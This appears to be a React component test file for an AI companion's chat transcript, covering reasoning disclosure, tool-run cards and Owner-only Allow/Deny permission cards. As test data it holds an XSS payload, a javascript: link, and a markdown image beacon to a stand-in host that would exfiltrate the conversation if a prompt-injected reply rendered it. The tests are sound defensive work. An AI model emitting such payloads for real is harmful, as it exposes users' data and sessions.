// @vitest-environment happy-dom

import React, { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import type {
  Companion,
  CompanionDecision,
  CompanionThread as Thread,
  CompanionToolRun,
  CompanionTranscriptEntry,
} from "@companion/contracts";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/**
 * Product promise:
 * A Companion turn is one message with everything the turn did inside it: the reply, the reasoning
 * behind it, the tool runs it performed, and the permission cards it is blocked on. A reader can
 * unfold any of them, and an Owner or Editor can decide a card without leaving the conversation.
 *
 * Regression caught:
 * THE-364 rebuilt this thread on assistant-ui message parts. The cards moved from hand-rolled
 * `system`-role messages into tool parts, which is where a decision could quietly stop reaching the
 * control plane, a Viewer could quietly be handed controls, and a run's disclosed detail could
 * quietly stop opening.
 *
 * Why this test renders:
 * The interactions are the promise. Reasoning and tool detail are disclosures — closed until asked
 * for — and Allow/Deny is a request, so nothing here can be observed in static markup.
 */

const decide = vi.fn(async (): Promise<Thread> => nextThread);
vi.mock("../../lib/companions", () => ({
  decideCompanionDecision: (...args: unknown[]) => decide(...(args as [])),
}));

const { CompanionTranscript } = await import("./CompanionTranscript");

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const companionId = "11111111-1111-4111-8111-111111111111";

const companion: Companion = {
  id: companionId,
  name: "Luna",
  persona: "Content marketing assistant",
  model_id: "claude-opus-4-8",
  selected_skill_ids: [],
  can_write_skills: false,
  selected_mcp_account_ids: [],
  owner_id: "user-1",
  access: "owner",
  pinned: false,
  hidden: false,
  unread: false,
  runtime: {
    state: "running",
    daemon_state: "running",
    box_id: "bx_23456789",
    provider_ids: ["anthropic"],
    provider_credential_generation: null,
    disk_layout_version: 2,
    desktop_available: false,
    last_error: null,
    last_observed_at: null,
    last_started_at: null,
    last_stopped_at: null,
  },
  created_at: "2026-08-12T12:00:00.000Z",
  updated_at: "2026-08-12T12:00:00.000Z",
};

function thread(entries: CompanionTranscriptEntry[], overrides: Partial<Thread> = {}): Thread {
  return {
    companion_id: companionId,
    viewer_id: "user-1",
    access: "owner",
    read_only: false,
    can_send: true,
    entries,
    pending_count: 0,
    last_message_at: null,
    ...overrides,
  };
}

const nextThread = thread([]);

function entry(overrides: Partial<CompanionTranscriptEntry>): CompanionTranscriptEntry {
  return {
    event_id: "pi:0",
    ordinal: 0,
    role: "assistant",
    content: "",
    reasoning: null,
    author_id: null,
    author_name: null,
    tool: null,
    decision: null,
    created_at: "2026-08-12T12:01:00.000Z",
    ...overrides,
  };
}

function run(overrides: Partial<CompanionToolRun> = {}): CompanionToolRun {
  return {
    call_id: "call_1",
    kind: "shell",
    name: "bash",
    title: "ls -la",
    status: "ok",
    detail: null,
    screenshot: null,
    ...overrides,
  };
}

function card(overrides: Partial<CompanionDecision> = {}): CompanionDecision {
  return {
    request_id: "ui-1",
    kind: "shell",
    name: "bash",
    title: "rm -rf build",
    detail: null,
    status: "pending",
    answer: null,
    decided_by_id: null,
    decided_by_name: null,
    decided_at: null,
    expires_at: "2026-08-12T12:10:00.000Z",
    ...overrides,
  };
}

const roots: Root[] = [];

/** Every thread the component handed back, so the decided-card refresh can be observed. */
let threads: Thread[] = [];

function mount(value: Thread) {
  const container = document.createElement("div");
  document.body.appendChild(container);
  const root = createRoot(container);
  roots.push(root);
  act(() => {
    root.render(React.createElement(CompanionTranscript, {
      companion,
      thread: value,
      orgId: "org-1",
      busy: false,
      onSend: async () => true,
      onThread: (next: Thread) => threads.push(next),
    }));
  });
  return container;
}

function buttonNamed(container: HTMLElement, name: string): HTMLButtonElement | undefined {
  return [...container.querySelectorAll("button")]
    .find((button) => (button.textContent ?? "").trim() === name);
}

function click(target: Element) {
  act(() => {
    target.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
  });
}

beforeEach(() => {
  decide.mockClear();
  decide.mockImplementation(async () => nextThread);
  threads = [];
});

afterEach(() => {
  act(() => roots.splice(0).forEach((root) => root.unmount()));
  document.body.innerHTML = "";
});

describe("a Companion turn's reasoning", () => {
  it("stays folded away until a reader asks for it", () => {
    const container = mount(thread([
      entry({ content: "Two services timed out.", reasoning: "I read the incident log first." }),
    ]));
    const trigger = container.querySelector("[data-slot='reasoning-trigger']") as HTMLElement;

    // The reply is the answer; the thinking behind it is disclosure and starts closed.
    expect(trigger.getAttribute("data-state")).toBe("closed");
    expect(container.textContent).toContain("Two services timed out.");

    click(trigger);

    expect(trigger.getAttribute("data-state")).toBe("open");
    expect(container.textContent).toContain("I read the incident log first.");
  });

  it("is offered only by a turn that produced any", () => {
    const container = mount(thread([entry({ content: "2025" })]));

    expect(container.querySelector("[data-slot='reasoning-trigger']")).toBeNull();
  });
});

describe("a Companion reply as markdown", () => {
  it("renders the structure Pi wrote", () => {
    const container = mount(thread([
      entry({ content: "## Incident\n\n- one\n- two\n\n```bash\nls -la\n```" }),
    ]));

    expect(container.querySelector("h2")?.textContent).toBe("Incident");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("pre code")?.textContent).toContain("ls -la");
  });

  it("keeps markup a model wrote as text instead of as elements", () => {
    // A reply is model output, and a model can be told what to say by a page it browsed. Raw HTML
    // must never become part of this document.
    const container = mount(thread([
      entry({ content: "<img src=x onerror=alert(1)> and <b>bold</b>" }),
    ]));

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.textContent).toContain("<img src=x onerror=alert(1)>");
  });

  it("never fetches an image a reply asked for", () => {
    // `![](https://elsewhere/?d=…)` would send the conversation to whoever wrote it, with no click
    // and no way for the reader to know. The description stands in for the image instead.
    const container = mount(thread([
      entry({ content: "![the leak](https://example.invalid/beacon?d=secret)" }),
    ]));

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("example.invalid");
    expect(container.textContent).toContain("[image: the leak]");
  });

  it("refuses a javascript: link", () => {
    const container = mount(thread([entry({ content: "[click](javascript:alert(1))" })]));

    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript:");
  });
});

describe("a tool run in the thread", () => {
  it("reports what ran and how it ended without unfolding anything", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ detail: "total 8\n" }) }),
    ]));
    const runCard = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(runCard.textContent).toContain("bash");
    expect(runCard.textContent).toContain("ls -la");
    // The status is never left to the tick alone.
    expect(runCard.textContent).toContain("done");
    expect(runCard.textContent).not.toContain("total 8");
  });

  it("unfolds the arguments and the result when asked", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ detail: "total 8\n" }) }),
    ]));
    const trigger = container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement;

    click(trigger);

    expect(container.textContent).toContain("total 8");
  });

  it("has nothing to unfold when Pi reported nothing about the run", () => {
    const container = mount(thread([entry({ role: "tool", content: "ls -la", tool: run() })]));
    const trigger = container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement;

    expect(trigger.disabled).toBe(true);
  });

  it("shows the Box desktop as the run left it", () => {
    const screenshot = "data:image/png;base64,iVBORw0KGgo=";
    const container = mount(thread([
      entry({ role: "tool", content: "click", tool: run({ kind: "computer", screenshot }) }),
    ]));
    const frame = container.querySelector("img") as HTMLImageElement;

    expect(frame.getAttribute("src")).toBe(screenshot);
    expect(frame.getAttribute("alt")).toContain("The Box desktop after");
  });

  it("keeps a run that is still open marked as busy", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ status: "running" }) }),
    ]));
    const runCard = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(runCard.getAttribute("aria-busy")).toBe("true");
    expect(runCard.textContent).toContain("running");
  });
});

describe("a permission card in the thread", () => {
  it("sends an Owner's Allow to the control plane", async () => {
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));

    const allow = buttonNamed(container, "Allow");
    expect(allow).toBeDefined();
    await act(async () => {
      allow!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-1", { action: "allow" });
    // The thread the control plane answered with goes straight back to the surface, so the card
    // leaves `pending` on the spot rather than at the next poll.
    expect(threads).toEqual([nextThread]);
  });

  it("sends one decision even when Allow is pressed twice before it settles", async () => {
    // This is the control that unblocks a shell command inside the Box. Pressing it twice must not
    // ask twice.
    let settle: (thread: Thread) => void = () => {};
    decide.mockImplementation(() => new Promise<Thread>((resolve) => { settle = resolve; }));
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));
    const allow = buttonNamed(container, "Allow")!;

    click(allow);
    click(allow);
    await act(async () => {
      settle(nextThread);
    });

    expect(decide).toHaveBeenCalledTimes(1);
  });

  it("sends a Deny the same way", async () => {
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));

    await act(async () => {
      buttonNamed(container, "Deny")!
        .dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-1", { action: "deny" });
  });

  it("answers a question with what was typed, and refuses an empty answer", async () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-q",
        content: "Which environment?",
        decision: card({ request_id: "ui-q", kind: "question", name: "ask_user" }),
      }),
    ]));
    const field = container.querySelector("input[aria-label='Answer']") as HTMLInputElement;
    const form = container.querySelector("form") as HTMLFormElement;

    // Nothing typed is nothing to send: the card must not resolve on an empty submit.
    await act(async () => {
      form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
    });
    expect(decide).not.toHaveBeenCalled();

    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
    act(() => {
      setter?.call(field, "staging");
      field.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => {
      form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-q", {
      action: "answer",
      answer: "staging",
    });
  });

  it("keeps a decided card on the transcript with who decided it, and no controls", () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-1",
        content: "rm -rf build",
        decision: card({ status: "denied", decided_by_id: "user-2", decided_by_name: "Ada" }),
      }),
    ]));

    expect(container.textContent).toContain("denied by Ada");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
    expect(buttonNamed(container, "Deny")).toBeUndefined();
  });

  it("reads a timed-out card as the denial it was", () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-1",
        content: "rm -rf build",
        decision: card({ status: "expired" }),
      }),
    ]));

    expect(container.textContent).toContain("Timed out, denied");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
  });

  it("tells a Viewer who the thread is waiting on instead of offering the controls", () => {
    const container = mount(thread(
      [entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() })],
      { access: "viewer", read_only: true, can_send: false, viewer_id: "user-9" },
    ));

    expect(container.textContent).toContain("Waiting for an Owner or Editor");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
    expect(buttonNamed(container, "Deny")).toBeUndefined();
  });
});
